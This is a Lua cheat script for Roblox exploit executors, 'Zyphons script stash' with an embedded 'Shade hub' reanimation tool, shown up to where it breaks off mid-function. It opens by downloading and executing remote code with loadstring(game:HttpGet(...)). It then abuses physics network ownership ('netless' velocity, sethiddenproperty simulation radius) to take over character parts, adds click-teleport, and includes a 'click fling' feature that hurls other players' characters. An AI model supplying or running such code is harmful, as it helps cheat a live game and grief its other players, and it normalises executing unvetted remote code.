local lib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/Vape.txt")()

local win = lib:Window("Zyphons script stash :3",Color3.fromRGB(255, 255, 255), Enum.KeyCode.RightControl)

local tab = win:Tab("Hats and animations")

tab:Button("Shade hub", function()
--[[
Made by Chip
UI Made by MyWorld
Look in Hax Updates discord for hats
Enjoy
]]
local plrs=game:FindFirstChildOfClass("Players")
local rs=game:FindFirstChildOfClass("RunService")
local ws=game:FindFirstChildOfClass("Workspace")
local uis=game:FindFirstChildOfClass("UserInputService")
local gs=game:FindFirstChildOfClass("GuiService")
local cg=game:FindFirstChildOfClass("CoreGui")

local lp=plrs.LocalPlayer
local pg=lp:FindFirstChildOfClass("PlayerGui")
local mouse=lp:GetMouse()
local stepped=rs.Stepped
local heartbeat=rs.Heartbeat
local renderstepped=rs.RenderStepped

local osclock=os.clock
local tspawn=task.spawn
local twait=task.wait
local schar=string.char
local sbyte=string.byte
local ssub=string.sub
local sfind=string.find
local supper=string.upper
local mrandom=math.random
local clamp=math.clamp
local sin=math.sin
local cos=math.cos
local abs=math.abs
local rad=math.rad
local tinsert=table.insert
local tclear=table.clear
local tclone=table.clone
local tfind=table.find
local tunpack=table.unpack

local i=Instance.new 
local v2=Vector2.new 
local v3=Vector3.new
local c3=Color3.new 
local cf=CFrame.new
local angles=CFrame.Angles
local u2=UDim2.new
local e=Enum 
local cs=ColorSequence.new 
local csk=ColorSequenceKeypoint.new 

local sine=osclock()
local deltaTime=0
local v3_0=v3(0,0,0)
local v3_101=v3(1,0,1)
local v3_010=v3(0,1,0)
local v3_001=v3(0,0,1)
local cf_0=cf(0,0,0)
local v3_xz=v3_101*10
local v3_net=v3_010*25.01

local function makepcall(f)
	if type(f)=="function" then
		return function(...)
			local a={...}
			local r=nil
			pcall(function()
				r={f(tunpack(a))}
			end)
			return tunpack(r or {})
		end
	end
	return function() end
end
local function rs(l) 
	l=l or mrandom(8,15) 
	local s="" 
	for i=1,l do 
		if mrandom(1,2)==1 then 
			s=s..schar(mrandom(65,90)) 
		else 
			s=s..schar(mrandom(97,122)) 
		end 
	end 
	return s 
end 
local function dfind(t,v)
	for i,v1 in pairs(t) do
		if v1==v then
			return i
		end
	end
	return nil
end
local function gp(p,n,cl)
	if typeof(p)=="Instance" then
		local c=p:GetChildren()
		for i=1,#c do
			local v=c[i]
			if (v.Name==n) and v:IsA(cl) then
				return v
			end
		end
	end
	return nil
end
local function loopgp(...)
	while true do
		local r=gp(...)
		if r then
			return r
		end
		twait()
	end
end
local function timegp(p,n,c,t)
	t=osclock()+t
	while t>osclock() do
		local r=gp(p,n,c)
		if r then
			return r
		end
		twait()
	end
	return nil
end
local function getNetlessVelocity(realVel)
	--if true then return v3_0 end
	--if true then return realPartVelocity end
	--if true then return v3_net end
	if realVel.Magnitude>25.01 then
		realVel=realVel.Unit*25.01
	end
	return realVel*v3_xz+v3_net
end
local isClientInstance=makepcall(function(i)
	return ssub(i:GetDebugId(),1,1)=="0"
end)
local isServerInstance=function(i)
	return not isClientInstance(i)
end
local shp=(((type(getfenv)=="function") and getfenv()) or {}).sethiddenproperty

local i1=i("Frame") 
local i2=i("Frame") 
local i3=i("ScrollingFrame") 
local i4=i("UIListLayout") 
local i5=i("UIGradient") 
local i6=i("TextLabel") 
local i7=i("TextButton") 
local i8=i("UIGradient") 
local i9=i("ScreenGui") 
i1.AnchorPoint=v2(0.5,0) 
i1.BackgroundColor3=c3(1,1,1) 
i1.BorderSizePixel=0 
i1.Position=u2(0.5,0,0.5,-150) 
i1.Size=u2(0,200,0,305)
i1.Name=rs() 
i1.Parent=i9 
i2.BackgroundColor3=c3(1,1,1) 
i2.BorderSizePixel=0 
i2.Position=u2(0,5,0,20) 
i2.Size=u2(1,-10,1,-25) 
i2.Name=rs() 
i2.Parent=i1 
i3.Active=true 
i3.BackgroundTransparency=1 
i3.BorderSizePixel=0 
i3.Size=u2(1,-3,1,0) 
i3.AutomaticCanvasSize=e.AutomaticSize.Y 
i3.CanvasSize=u2(0,0,0,0) 
i3.ScrollBarThickness=7 
i3.Name=rs() 
i3.Parent=i2 
i4.Name=rs() 
i4.Parent=i3 
i4.SortOrder=e.SortOrder.LayoutOrder 
i5.Name=rs() 
i5.Parent=i2 
i5.Color=cs({[1]=csk(0,c3(0.121569,0.121569,0.121569)),[2]=csk(1,c3(0.0705882,0.0705882,0.0705882))}) 
i5.Rotation=90 
i6.Font=e.Font.SourceSans 
i6.FontSize=e.FontSize.Size18 
i6.Text="Shade Hub" 
i6.TextColor3=c3(0,0,1) 
i6.TextSize=16 
i6.BackgroundTransparency=1 
i6.BorderSizePixel=0 
i6.Position=u2(0,1,0,1) 
i6.Size=u2(1,-2,0,20) 
i6.Name=rs() 
i6.Parent=i1 
i7.AnchorPoint=v2(1,0) 
i7.BackgroundTransparency=1 
i7.Position=u2(1,0,0,0) 
i7.Size=u2(0,40,1,0) 
i7.Name=rs() 
i7.Parent=i6 
i7.Font=e.Font.SourceSans 
i7.FontSize=e.FontSize.Size18 
i7.Text="-" 
i7.TextColor3=c3(1,1,1) 
i7.TextSize=16 
i8.Name=rs() 
i8.Parent=i1 
i8.Color=cs({[1]=csk(0,c3(0,0,0)),[2]=csk(1,c3(0,0,0.584314))}) 
i8.Rotation=90 
i9.ZIndexBehavior=e.ZIndexBehavior.Sibling 
i9.IgnoreGuiInset=true 
i9.ResetOnSpawn=false 
i9.Name=rs() 
local min=false
i7.MouseButton1Click:Connect(function()
	min = not min
	if min then
		i2.Visible=false 
		i8.Color=cs({[1]=csk(0,c3(0,0,0)),[2]=csk(1,c3(0,0,0))}) 
		i1.Size=u2(0,200,0,22) 
	else
		i1.Size=u2(0,200,0,305) 
		i8.Color=cs({[1]=csk(0,c3(0,0,0)),[2]=csk(1,c3(0,0,0.584314))}) 
		i2.Visible=true 
	end
end)
local function Draggable(window,obj)
	local MB1enum = e.UserInputType.MouseButton1
	local TOUCHenum = e.UserInputType.Touch
	obj = obj or window
	local activeEntered = 0
	local mouseStart = nil
	local dragStart = nil
	local inputbegancon = nil
	local rendersteppedcon = nil
	local inputendedcon = nil
	local function inputendedf(a)
		a=a.UserInputType
		if (a==MB1enum) or (a==TOUCHenum) then
			rendersteppedcon:Disconnect()
			inputendedcon:Disconnect()
		end
	end
	local function rendersteppedf()
		local off = uis:GetMouseLocation()-mouseStart
		window.Position=dragStart+u2(0,off.X,0,off.Y)
	end
	local function inputbeganf(a)
		a=a.UserInputType
		if ((a==MB1enum) or (a==TOUCHenum)) and (activeEntered==0) and not uis:GetFocusedTextBox() then
			mouseStart=uis:GetMouseLocation()
			dragStart=window.Position
			if rendersteppedcon then rendersteppedcon:Disconnect() end
			rendersteppedcon = renderstepped:Connect(rendersteppedf)
			if inputendedcon then inputendedcon:Disconnect() end
			inputendedcon = uis.InputEnded:Connect(inputendedf)
		end
	end
	obj.MouseEnter:Connect(function()
		if inputbegancon then inputbegancon:Disconnect() end
		inputbegancon = uis.InputBegan:Connect(inputbeganf)
	end)
	obj.MouseLeave:Connect(function()
		inputbegancon:Disconnect()
	end)
	local function ondes(d)
		if d:IsA("GuiObject") then
			local thisEntered = false
			local thisAdded = false
			local con0 = d.MouseEnter:Connect(function()
				thisEntered = true
				if (not thisAdded) and d.Active then
					activeEntered = activeEntered + 1
					thisAdded = true
				end
			end)
			local con1 = d.MouseLeave:Connect(function()
				thisEntered = false
				if thisAdded then
					activeEntered = activeEntered - 1
					thisAdded = false
				end
			end)
			local con2 = d:GetPropertyChangedSignal("Active"):Connect(function()
				if thisEntered then
					if thisAdded and not d.Active then
						activeEntered = activeEntered - 1
						thisAdded = false
					elseif d.Active and not thisAdded then
						activeEntered = activeEntered + 1
						thisAdded = true
					end
				end
			end)
			local con3 = nil
			con3 = d.AncestryChanged:Connect(function()
				if not d:IsDescendantOf(window) then
					if thisEntered then
						activeEntered = activeEntered - 1
					end
					con0:Disconnect()
					con1:Disconnect()
					con2:Disconnect()
					con3:Disconnect()
				end
			end)
		end
	end
	window.DescendantAdded:Connect(ondes)
	local des=window:GetDescendants()
	for i=1,#des do 
		ondes(des[i])
	end
end
local function btn(txt, f)
	local i1=i("TextButton") 
	i1.AutomaticSize=e.AutomaticSize.Y 
	i1.BackgroundTransparency=1 
	i1.Size=u2(1,0,0,0) 
	i1.Name=rs() 
	i1.Font=e.Font.SourceSans 
	i1.FontSize=e.FontSize.Size14 
	i1.Text=txt 
	i1.TextColor3=c3(0.0941177,0.317647,0.878431) 
	if f then 
		i1.MouseButton1Click:Connect(f) 
	end 
	i1.Parent=i3 
	return i1
end
local function lbl(txt)
	local i1=i("TextLabel") 
	i1.Font=e.Font.SourceSans 
	i1.FontSize=e.FontSize.Size14 
	i1.Text=txt 
	i1.TextColor3=c3(0.560784,0.560784,0.560784) 
	i1.AutomaticSize=e.AutomaticSize.Y 
	i1.BackgroundTransparency=1 
	i1.Size=u2(1,0,0,0) 
	i1.Name=rs() 
	i1.Parent=i3 
	return i1
end

Draggable(i1)

lbl("Patchma Credits")
lbl("UI by MyWorld")
lbl("FDless by MyWorld")
lbl("--------------------------")
lbl("Animated by Chip")
lbl("Animated by Sticks")
lbl("Animated by Maximilito")
lbl("--------------------------")
lbl("Enjoy!")
local allowshiftlock=nil
local ctrltp=nil
local simrad=nil
local placeholders=nil
local clickfling=nil
local highlightflingtargets=nil

local stopreanimate=function() return nil end
local function reanimate()
	--[[
	    FDless reanimate by MyWorld
	    aka no client sided instances
	    "what else do i optimize here"
	]]

	local novoid = true --prevents parts from going under workspace.FallenPartsDestroyHeight if you control them
	local placeholders = placeholders --makes client sided accessories replacing the real ones when unavailable
	local speedlimit = 3000 --makes your parts move slower if the magnitude of their velocity is higher than this
	local antiragdoll = true --removes instances that are usually used for ragdolling form your character
	local R15toR6 = true --adds fake r6 parts and joints for animations if your character is r15
	local walkSpeed = 16 --your walkspeed (can be changed at runtime)
	local jumpPower = 50 --your jump power (can be changed at runtime)
	local allowshiftlock = allowshiftlock --allows the user to use shiftlock (can be changed at runtime)
	local gravity = 196.2 --how fast the characters velocity decreases while falling (can be changed at runtime)
	local simrad = simrad --sets simulation radius to this with sethiddenproperty if its set to a number
	local ctrlclicktp = ctrltp --makes you teleport where u point ur mouse cursor at when click and hold ctrl down
	local clickfling = clickfling --makes you fling the person you clicked when its available to do so
	local flingvel = v3(15000,15000,15000) --the rotation velocity that ur character will have while flinging
	local highlightflingtargets = highlightflingtargets --highlights characters that are going to get flung

	local c=lp.Character
	if stopreanimate() or not (c and c:IsDescendantOf(ws)) then return end
	
	local hum=c:FindFirstChildOfClass("Humanoid")
	local rootpart=gp(c,"HumanoidRootPart","BasePart") or gp(c,"Torso","BasePart") or gp(c,"UpperTorso","BasePart") or (hum and hum.RootPart) or timegp(c,"HumanoidRootPart","BasePart",0.5) or c:FindFirstChildWhichIsA("BasePart")
	if not rootpart then return end

	R15toR6=R15toR6 and hum and (hum.RigType==e.HumanoidRigType.R15)
	simrad = (type(simrad)=="number") and (type(shp)=="function") and simrad

	local cam=nil
	--theres a way to have ws.currentcamera nil on heartbeat and still have the game run normally
	local function refcam()
		cam=ws.CurrentCamera
		while not cam do
			ws:GetPropertyChangedSignal("CurrentCamera"):Wait()
			cam=ws.CurrentCamera
		end
	end
	refcam()
	local camcf=cam.CFrame
	local enumCamS=e.CameraType.Scriptable
	local camt=cam.CameraType
	local camcon0=nil
	local camcon1=nil
	local function onnewcamera()
		refcam()
		if camcon0 then 
			camcon0:Disconnect()
			camcon0=nil
		end
		if not c then 
			if cam.CameraType==enumCamS then
				cam.CameraType=camt
			end
			return camcon1:Disconnect() 
		end
		camcon0=cam.Changed:Connect(function(p)
			if not c then
				camcon0:Disconnect()
				return camcon1:Disconnect()
			end
			if (p=="CFrame") and (cam.CFrame~=camcf) then
				cam.CFrame=camcf
			elseif (p=="CameraSubject") or (p=="CameraType") then
				local subj=cam.CameraSubject
				if subj and subj:IsA("Humanoid") and (subj.Parent==c) and (cam.CameraType~=enumCamS) then
					cam.CameraType = enumCamS
				end
			end
		end)
		local subj=cam.CameraSubject
		if subj and subj:IsA("Humanoid") and (subj.Parent==c) and (cam.CameraType~=enumCamS) then
			cam.CameraType=enumCamS
		end
		cam.CFrame=camcf
	end
	camcon1=ws:GetPropertyChangedSignal("CurrentCamera"):Connect(onnewcamera)
	onnewcamera()

	local fpdh=ws.FallenPartsDestroyHeight
	novoid=novoid and (fpdh+1)
	
	local function getMeshOfPart(v)
		if typeof(v)=="Instance" then
			if v:IsA("MeshPart") then
				return v.MeshId, v.TextureID
			else
				v=v:FindFirstChildOfClass("SpecialMesh")
				if v then
					return v.MeshId, v.TextureId
				end
			end
		end
		return nil, nil
	end
	
	local joints={}
	local cframes={}
	local des=c:GetDescendants()
	for i=1,#des do
		local v=des[i]
		if v:IsA("JointInstance") then
			tinsert(joints,{
				Name=v.Name,
				C0=v.C0,
				C1=v.C1,
				Part0=v.Part0,
				Part1=v.Part1
			})
		elseif v:IsA("BasePart") then
			cframes[v]=v.CFrame
		end
	end
	
	local function makeplaceholder(v)
		if typeof(v)~="Instance" then
			return nil
		end
		if not v.Archivable then
			v.Archivable=true
		end
		v=v:Clone()
		local c=v:GetChildren()
		for i=1,#c do
			local v=c[i]
			if v:IsA("SpecialMesh") then
				v.Name=rs()
				v:ClearAllChildren()
			else
				v:Destroy()
			end
		end
		v.Name=rs()
		v.Anchored=true
		v.CanCollide=false
		v.Transparency=0.25
		v.Parent=ws
		return v
	end
	
	local function filterInstance(v)
		local ins=v
		if isClientInstance(v) then
			v={CFrame=v.CFrame,Name=v.Name,Anchored=true}
		else
			local meshid,textureid=getMeshOfPart(v)
			if meshid and (meshid~="") and textureid and (textureid~="") then
				if placeholders then
					v={CFrame=v.CFrame,Name=v.Name,Anchored=true,meshid=meshid,textureid=textureid,placeholder=makeplaceholder(v)}
				else
					v={CFrame=v.CFrame,Name=v.Name,Anchored=true,meshid=meshid,textureid=textureid}
				end
			else
				v={CFrame=v.CFrame,Name=v.Name,Anchored=true}
			end
		end
		for i,v1 in pairs(tclone(cframes)) do
			if i==ins then
				cframes[ins]=nil
				cframes[v]=v1
			end
		end
		for i,v1 in pairs(joints) do
			if v1.Part0==ins then
				v1.Part0=v
			elseif v1.Part1==ins then
				v1.Part1=v
			end
		end
		if rootpart==ins then
			rootpart=v
		end
		return v
	end
	for i,v in pairs(joints) do
		v.Part0=filterInstance(v.Part0)
		v.Part1=filterInstance(v.Part1)
	end
	
	local Yvel=0
	local cfr=rootpart.CFrame
	local pos=cfr.Position
	local shiftlock=false
	local firstperson=false
	local xzvel=v3_0
	local v3_0150=v3_010*1.5
	local camoff=cf(v3_0,camcf.LookVector)
	camoff=camoff-v3_001*(camcf.Position-(pos+v3_0150)).Magnitude

	local refreshjointsinternal=nil
	refreshjointsinternal=function(part,refreshed)
		if not part then return end
		tinsert(refreshed,part)
		for i,v in pairs(joints) do
			local part0=v.Part0
			local part1=v.Part1
			if part1 and (part0==part) then
				cframes[part1]=cframes[part]*v.C0*v.C1:Inverse()
				if not tfind(refreshed,part1) then
					refreshjointsinternal(part1,refreshed)
				end
			elseif part0 and (part1==part) then
				cframes[part0]=cframes[part]*v.C1*v.C0:Inverse()
				if not tfind(refreshed,part0) then
					refreshjointsinternal(part0,refreshed)
				end
			end
		end
	end
	local function refreshjoints(v)
		refreshjointsinternal(v,{})
	end

	if R15toR6 then
		local R6parts={ 
			head={Name="Head",Anchored=true},
			torso={Name="Torso",Anchored=true},
			root={Name="HumanoidRootPart",Anchored=true},
			leftArm={Name="Left Arm",Anchored=true},
			rightArm={Name="Right Arm",Anchored=true},
			leftLeg={Name="Left Leg",Anchored=true},
			rightLeg={Name="Right Leg",Anchored=true}
		}
		for i,v in pairs(R6parts) do
			cframes[v]=cfr
		end
		tinsert(joints,{
			Name="Neck",
			Part0=R6parts.torso,Part1=R6parts.head,
			C0=cf(0,1,0,-1,0,0,0,0,1,0,1,-0),
			C1=cf(0,-0.5,0,-1,0,0,0,0,1,0,1,-0)
		})
		tinsert(joints,{
			Name="RootJoint",
			Part0=R6parts.root,Part1=R6parts.torso,
			C0=cf(0,0,0,-1,0,0,0,0,1,0,1,-0),
			C1=cf(0,0,0,-1,0,0,0,0,1,0,1,-0)
		})
		tinsert(joints,{
			Name="Right Shoulder",
			Part0=R6parts.torso,Part1=R6parts.rightArm,
			C0=cf(1,0.5,0,0,0,1,0,1,-0,-1,0,0),
			C1=cf(-0.5,0.5,0,0,0,1,0,1,-0,-1,0,0)
		})
		tinsert(joints,{
			Name="Left Shoulder",
			Part0=R6parts.torso,Part1=R6parts.leftArm,
			C0=cf(-1,0.5,0,0,0,-1,0,1,0,1,0,0),
			C1=cf(0.5,0.5,0,0,0,-1,0,1,0,1,0,0)
		})
		tinsert(joints,{
			Name="Right Hip",
			Part0=R6parts.torso,Part1=R6parts.rightLeg,
			C0=cf(1,-1,0,0,0,1,0,1,-0,-1,0,0),
			C1=cf(0.5,1,0,0,0,1,0,1,-0,-1,0,0)
		})
		tinsert(joints,{
			Name="Left Hip" ,
			Part0=R6parts.torso,Part1=R6parts.leftLeg,
			C0=cf(-1,-1,0,0,0,-1,0,1,0,1,0,0),
			C1=cf(-0.5,1,0,0,0,-1,0,1,0,1,0,0)
		})
		tinsert(joints,{
			Part0=R6parts.root,Part1=rootpart,
			C0=cf_0,C1=cf_0
		})
		refreshjoints(rootpart)
		local function getpart(n)
			for i,_ in pairs(cframes) do
				if (i.Name==n) and not dfind(R6parts,i) then
					return i
				end
			end
			return nil
		end
		local function makejoint(p0, p1, p2)
			p1=getpart(p1)
			p2=getpart(p2)
			if not (p1 and p2) then return end
			for i,v in pairs(joints) do
				if (v.Part0==p1) and (v.Part1==p2) then
					joints[i]=nil
				elseif (v.Part0==p2) and (v.Part1==p1) then
					joints[i]=nil
				end
			end
			tinsert(joints,{
				Part0=p0,Part1=p1,
				C0=cf_0,
				C1=cframes[p1]:Inverse()*cframes[p0]
			})
		end
		makejoint(R6parts.head,"Head","UpperTorso")
		makejoint(R6parts.leftArm,"LeftUpperArm","UpperTorso")
		makejoint(R6parts.rightArm,"RightUpperArm","UpperTorso")
		makejoint(R6parts.leftLeg,"LeftUpperLeg","LowerTorso")
		makejoint(R6parts.rightLeg,"RightUpperLeg","LowerTorso")
		makejoint(R6parts.torso,"LowerTorso","HumanoidRootPart")
	end
		
	local function getPart(name,blacklist)
		for i,v in pairs(cframes) do
			if (i.Name==name) and not (blacklist and tfind(blacklist,i)) then
				return i
			end
		end
		return nil
	end

	local function getPartFromMesh(meshid,textureid,blacklist)
		for v,_ in pairs(cframes) do
			if (type(v)=="table") and not (blacklist and tfind(blacklist,v)) then
				if v.meshid and sfind(v.meshid,meshid) and sfind(v.textureid,textureid) then
					return v
				end
			end
		end
		return nil
	end

	local function getJoint(name)
		for i,v in pairs(joints) do
			if v.Name==name then
				return v
			end
		end
		return {C0=cf_0,C1=cf_0}
	end

	local function getPartJoint(handle)
		for i,v in pairs(joints) do
			if v.Part0==handle then
				return v
			end
		end
		for i,v in pairs(joints) do
			if v.Part1==handle then
				return v
			end
		end
		return nil
	end

	local accessorylimbs={	
		
		{meshid="11263221350",textureid="11263219250",C0=angles(1.5707963267948966,0,1.5707963267948966),Name="Left Arm"},
		{meshid="11159370334",textureid="11159284657",C0=angles(-1.5707963267948966,0,1.5707963267948966),Name="Right Arm"},
		{meshid="11159370334",textureid="11159285454",C0=angles(1.5707963267948966,0,1.5707963267948966),Name="Left Leg"},
		{meshid="12652772399",textureid="12652775021",C0=cf(0,-0.125,0),Name="Right Leg"},

		{meshid="13421774668",textureid="13415110780",C0=cf_0,Name="Torso"}
	}

	local alignblacklist={}
	for i=1,#accessorylimbs do
		local v=accessorylimbs[i]
		local p=getPart(v.Name)
		local h=getPartFromMesh(v.meshid,v.textureid,alignblacklist)
		local w=getPartJoint(h)
		if p and w then
			w.C0=v.C0
			w.Part0=h
			w.C1=cf_0
			w.Part1=p
			tinsert(alignblacklist,h)
		end
	end
		
	local raycastparams=RaycastParams.new()
	raycastparams.FilterType=e.RaycastFilterType.Blacklist
	raycastparams.RespectCanCollide=true
	local rayfilter={}
	local characters={}
	local function refreshrayfilter()
		tclear(rayfilter)
		for i,v in pairs(characters) do
			tinsert(rayfilter,v)
		end
		raycastparams.FilterDescendantsInstances=rayfilter
	end
	local flingtable={}
	local cframes1={}
	local lastpositions={}
	local rootparts={}
	local function ondes(v)
		twait()
		local meshid1,textureid1=getMeshOfPart(v)
		for i,v1 in pairs(cframes) do
			if type(i)=="table" and not dfind(cframes1,i) then 
				local meshid=i.meshid
				if meshid then
					if (meshid1==meshid) and (textureid1==i.textureid) then
						cframes1[v]=i
						lastpositions[v]=v.Position
						break
					end
				end
			end
		end
	end
	local function onplayer(v)
		local lastc=nil
		local function oncharacter()
			local newc=v.Character
			if newc and (newc ~= lastc) then
				lastc=newc
				characters[v]=newc
				refreshrayfilter()
				local hrp=timegp(newc,"HumanoidRootPart","BasePart",10)
				if not (hrp and c and newc:IsDescendantOf(ws)) then return end
				if v==lp then
					c=newc
					local startpos=pos+v3(mrandom(-32,32),0,mrandom(-32,32))
					local dir=nil
					local poscheck=true
					while poscheck do
						poscheck=false
						for i,v in pairs(rootparts) do
							local diff=(startpos-v.Position)*v3_101
							if diff.Magnitude<10 then
								poscheck=true
								dir=dir or diff.Unit
								startpos=startpos+dir
							end
						end
						local diff=(startpos-pos)*v3_101
						if diff.Magnitude<10 then
							poscheck=true
							dir=dir or diff.Unit
							startpos=startpos+dir
						end
					end
					startpos=cfr.Rotation+startpos
					local fi,fv=next(flingtable)
					if fi then
						for i,v in pairs(tclone(flingtable)) do
							if not c then
								return
							end
							local con=heartbeat:Connect(function()
								local idleoff=v3(sin((sine-0.0375)*16),sin(sine*16),sin((sine+0.075)*16))
								
								hrp.CFrame=i.CFrame+i.Velocity*(sin(sine*15)+1)+v3_010*-2+idleoff*0.001
								hrp.Velocity=i.Velocity*75+idleoff
								hrp.RotVelocity=flingvel+idleoff
							end)
							twait(0.5)
							con:Disconnect()
							if v then
								v:Destroy()
							end
							flingtable[i]=nil
						end
					end
					local con=heartbeat:Connect(function()
						hrp.CFrame=startpos+v3(sin((sine-0.0375)*16),sin(sine*16),sin((sine+0.075)*16))*0.005
						hrp.Velocity=v3_0
						hrp.RotVelocity=v3_0
					end)
					twait(0.26)
					con:Disconnect()
					newc:BreakJoints()
					tclear(cframes1)
					tclear(lastpositions)
					local cd=newc:GetDescendants()
					for i=1,#cd do
						tspawn(ondes,cd[i])
					end
					newc.DescendantAdded:Connect(ondes)
				else
					rootparts[v]=hrp
				end
			end
		end
		v:GetPropertyChangedSignal("Character"):Connect(oncharacter)
		oncharacter()
	end
	local plrst=plrs:GetPlayers()
	for i=1,#plrst do onplayer(plrst[i]) end
	plrs.PlayerAdded:Connect(onplayer)
	plrs.PlayerRemoving:Connect(function(v)
		characters[v]=nil
		rootparts[v]=nil
	end)
	
	local mradN05=rad(-0.5)
	local KeyCode=e.KeyCode
	local enumMLC=e.MouseBehavior.LockCenter
	local enumMB2=e.UserInputType.MouseButton2
	local enumMLCP=e.MouseBehavior.LockCurrentPosition
	local enumMD=e.MouseBehavior.Default
	local enumMW=e.UserInputType.MouseWheel

	local mode="default"
	local modes={default={}}
	local function addmode(key,mode)
		if (type(key)~="string") or (type(mode)~="table") then
			return
		end
		for i,v in pairs(mode) do
			if type(v)~="function" then
				mode[i]=nil
			end
		end
		if key=="default" then
			modes.default=mode
			if mode.modeEntered then
				mode.modeEntered()
			end
		elseif #key==1 then
			key=KeyCode[supper(ssub(key,1,1))]
			modes[key]=mode
		end
	end
	
	local keyW=KeyCode.W
	local Wpressed=uis:IsKeyDown(keyW)
	local keyA=KeyCode.A
	local Apressed=uis:IsKeyDown(keyA)
	local keyS=KeyCode.S
	local Spressed=uis:IsKeyDown(keyS)
	local keyD=KeyCode.D
	local Dpressed=uis:IsKeyDown(keyD)
	local keySpace=KeyCode.Space
	local spacePressed=uis:IsKeyDown(keySpace)
	
	local keyShift=KeyCode.LeftShift
	uis.InputBegan:Connect(function(a)
		if gs.MenuIsOpen or uis:GetFocusedTextBox() then
			return
		end
		a=a.KeyCode
		if a==keyW then
			Wpressed=true
		elseif a==keyA then
			Apressed=true
		elseif a==keyS then
			Spressed=true
		elseif a==keyD then
			Dpressed=true
		elseif a==keySpace then
			spacePressed=true
		elseif a==keyShift then
			shiftlock=allowshiftlock and not shiftlock
		elseif modes[a] then
			if modes[mode].modeLeft then
				modes[mode].modeLeft()
			end
			if mode==a then
				mode="default"
			else
				mode=a
			end
			if modes[mode].modeEntered then
				modes[mode].modeEntered()
			end
		end
	end)
	uis.InputEnded:Connect(function(a)
		a=a.KeyCode
		if a==keyW then
			Wpressed=false
		elseif a==keyA then
			Apressed=false
		elseif a==keyS then
			Spressed=false
		elseif a==keyD then
			Dpressed=false
		elseif a==keySpace then
			spacePressed=false
		end
	end)
	uis.InputChanged:Connect(function(a,b)
		if (not b) and (a.UserInputType==enumMW) then
			camoff=camoff+a.Position*v3_001*(0.75-camoff.Z/4)
			if camoff.Z>0 then
				camoff=camoff-camoff.Position
			end
			firstperson=camoff.Z==0
		end
	end)

	local function fling(target,duration,rotVelocity)
		if not c then
			return twait() and false
		end
		twait()
		return true --maybe later
	end

	local function predictionfling(target)
		if not c then
			return twait() and false
		end
		if typeof(target)~="Instance" then 
			target=mouse.Target
			if not target then
				return twait() and false
			end
		end
		if target:IsA("Humanoid") or target:IsA("BasePart") then 
			target=target.Parent 
			if target:IsA("Accessory") then
				target=target.Parent
			end
		end
		if (not target:IsA("Model")) or (target==c) then
			return twait() and false
		end
		local targetpart=gp(target,"HumanoidRootPart","BasePart") or gp(target,"Torso","BasePart") or gp(target,"UpperTorso","BasePart")
		if not (targetpart and targetpart:IsDescendantOf(ws)) then
			return twait() and false
		end
		if highlightflingtargets then
			local h=i("Highlight")
			h.Name=rs()
			h.Adornee=target
			h.FillColor=c3(1,0,0)
			h.OutlineColor=c3(1,0,0)
			h.FillTransparency=0.5
			h.OutlineTransparency=0
			h.Parent=i9
			flingtable[targetpart]=h
		else
			flingtable[targetpart]=false
		end
		twait()
		return true
	end

	if ctrlclicktp then
		ctrlclicktp=KeyCode.LeftControl
		local tpoff=v3_010*3
		if clickfling then
			mouse.Button1Down:Connect(function()
				if mouse.Target then
					if uis:IsKeyDown(ctrlclicktp) then
						pos=mouse.Hit.Position+tpoff
						cfr=cf(pos,pos+camoff.LookVector*v3_101)
						xzvel=v3_0
						Yvel=0
					else
						predictionfling()
					end
				end
			end)
		else
			mouse.Button1Down:Connect(function()
				if mouse.Target and uis:IsKeyDown(ctrlclicktp) then
					pos=mouse.Hit.Position+tpoff
					cfr=cf(pos,pos+camoff.LookVector*v3_101)
					xzvel=v3_0
					Yvel=0
				end
			end)
		end
	elseif clickfling then
		mouse.Button1Down:Connect(predictionfling)
	end

	local noYvelTime=1
	local lastsine=sine
	local pose=nil
	local con=nil
	local function mainFunction()
		if not c then 
			for i,v in pairs(cframes) do
				local p=i.placeholder
				if p then
					p:Destroy()
				end
			end
			for i,v in pairs(flingtable) do
				if v then
					v:Destroy()
				end
			end
			uis.MouseBehavior=enumMD
			onnewcamera()
			local c=lp.Character
			if c then
				cam.CameraSubject=c:FindFirstChildOfClass("Humanoid")
			end
			return con and con:Disconnect() 
		end

		sine=osclock()
		local delta=sine-lastsine
		deltaTime=clamp(delta*10,0,1)
		lastsine=sine

		if shiftlock then
			if allowshiftlock then
				uis.MouseBehavior=enumMLC
				local rotation=uis:GetMouseDelta()*mradN05
				local camoffpos=camoff.Position
				camoff=cf(camoffpos,camoffpos+camoff.LookVector)*angles(rotation.Y,rotation.X,0)
			else
				shiftlock=false
			end
		elseif firstperson then
			uis.MouseBehavior=enumMLC
			local rotation=uis:GetMouseDelta()*mradN05
			local camoffpos=camoff.Position
			camoff=cf(camoffpos,camoffpos+camoff.LookVector)*angles(rotation.Y,rotation.X,0)
		elseif uis:IsMouseButtonPressed(enumMB2) then
			uis.MouseBehavior=enumMLCP
			local rotation=uis:GetMouseDelta()*mradN05
			local camoffpos=camoff.Position
			camoff=cf(camoffpos,camoffpos+camoff.LookVector)*angles(rotation.Y,rotation.X,0)
		else
			uis.MouseBehavior=enumMD
		end

		local raycastresult=ws:Raycast(pos,v3_010*(fpdh-pos.Y),raycastparams)
		local onground=nil
		if raycastresult then
			raycastresult=raycastresult.Position
			onground=(pos.Y-raycastresult.Y)<3.01
			if onground then
				Yvel=0
				cfr=cfr+v3_010*(raycastresult.Y+3-pos.Y)*clamp(delta*20,0,1)
				if spacePressed then
					Yvel=jumpPower
				end
			else
				Yvel=Yvel-gravity*delta
				if pos.Y+Yvel*delta<raycastresult.Y then
					Yvel=0
					cfr=cfr+v3_010*(raycastresult.Y+3-pos.Y)
				end
			end
		else
			Yvel=0
			onground=false
		end
		xzvel=v3_0
		if Wpressed then
			xzvel=xzvel+(camoff.LookVector*v3_101).Unit
		end
		if Spressed then
			xzvel=xzvel-(camoff.LookVector*v3_101).Unit
		end
		if Apressed then
			xzvel=xzvel-(camoff.RightVector*v3_101).Unit
		end
		if Dpressed then
			xzvel=xzvel+(camoff.RightVector*v3_101).Unit
		end
		pos=cfr.Position
		if shiftlock or firstperson then
			if xzvel.Magnitude>0 then
				xzvel=xzvel.Unit*walkSpeed
			end
			cfr=cf(pos,pos+camoff.LookVector*v3_101)
		elseif xzvel.Magnitude>0 then
			xzvel=xzvel.Unit*walkSpeed
			cfr=cfr:Lerp(cf(pos,pos+xzvel),deltaTime)
		end
		cfr=cfr+(xzvel+(v3_010*Yvel))*delta
		pos=cfr.Position

